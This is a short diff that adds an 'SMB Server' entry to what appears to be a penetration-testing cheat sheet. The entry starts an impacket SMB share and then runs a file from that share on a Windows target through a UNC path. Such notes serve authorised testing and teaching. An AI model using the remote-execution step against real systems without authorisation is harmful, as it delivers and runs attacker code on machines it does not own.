@@ -5494,6 +5494,15 @@ Configure SSH:
 Usage:
   python -m SimpleHTTPServer [port]</info>
         </option>
+	    <option name="SMB Server">
+		    <info>Set up a simple SMB Server.
+			    
+Usage:
+	impacket-smbserver [name] `pwd`
+			   
+(on Windows target)
+	C:&gt; \\[server ip]\[name]\[file to execute]</info>
+	    </option>
         <option name="SMTP Server">
             <info>Set up a simple SMTP Server.
             
